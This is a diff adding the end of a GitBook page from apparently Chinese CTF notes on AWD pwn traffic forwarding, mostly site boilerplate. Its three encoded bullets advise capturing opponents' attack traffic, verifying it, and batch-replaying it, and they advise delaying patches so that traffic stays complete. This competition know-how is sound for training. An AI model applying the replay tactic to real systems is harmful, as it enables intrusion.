+<li>&#x6B65;&#x9AA4;&#x603B;&#x7ED3;&#xFF1A;&#x9009;&#x53D6;&#x653B;&#x51FB;&#x6D41;&#x91CF;-&gt;&#x672C;&#x5730;&#x9A8C;&#x8BC1;-&gt;&#x62FF;&#x81EA;&#x5DF1;&#x7684;&#x9776;&#x673A;&#x8FDC;&#x7A0B;&#x9A8C;&#x8BC1;-&gt;&#x6279;&#x91CF;&#x811A;&#x672C;</li>
+<li>&#x4E0D;&#x5EFA;&#x8BAE;&#x5F88;&#x65E9;&#x5C31;patch&#xFF0C;&#x8981;&#x4E0D;&#x7136;&#x522B;&#x4EBA;&#x653B;&#x51FB;&#x6D41;&#x91CF;&#x5C31;&#x4E0D;&#x5B8C;&#x6574;&#x4E86;</li>
+<li>&#x88AB;&#x6253;&#x4E86;&#x53EF;&#x4EE5;&#x7ACB;&#x9A6C;&#x4E0A;ttypatch&#xFF0C;&#x6BD5;&#x7ADF;&#x653B;&#x51FB;&#x6D41;&#x91CF;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x80FD;&#x591F;&#x6210;&#x529F;&#x7684;&#x5C31;&#x884C;</li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../" class="navigation navigation-prev " aria-label="Previous page: awd">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../evilPatcher_pwn通防/evilPatcher_pwn通防.html" class="navigation navigation-next " aria-label="Next page: evilPatcher_pwn通防">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"awdpwn流量转发手动","level":"1.5.1","depth":2,"next":{"title":"evilPatcher_pwn通防","level":"1.5.2","depth":2,"path":"awd/evilPatcher_pwn通防/evilPatcher_pwn通防.md","ref":"awd/evilPatcher_pwn通防/evilPatcher_pwn通防.md","articles":[]},"previous":{"title":"awd","level":"1.5","depth":1,"path":"awd/README.md","ref":"awd/README.md","articles":[{"title":"awdpwn流量转发手动","level":"1.5.1","depth":2,"path":"awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.md","ref":"awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.md","articles":[]},{"title":"evilPatcher_pwn通防","level":"1.5.2","depth":2,"path":"awd/evilPatcher_pwn通防/evilPatcher_pwn通防.md","ref":"awd/evilPatcher_pwn通防/evilPatcher_pwn通防.md","articles":[]},{"title":"如何在awd中苟活_pwn","level":"1.5.3","depth":2,"path":"awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.md","ref":"awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["-sharing","sharing-plus","-search","search-pro","code","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"TTY","lang":"zh-cn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Gitbook电子书","gitbook":"*","description":"Gitbook电子书示例项目"},"file":{"path":"awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.md","mtime":"2022-11-15T08:43:51.239Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-04T09:49:46.732Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
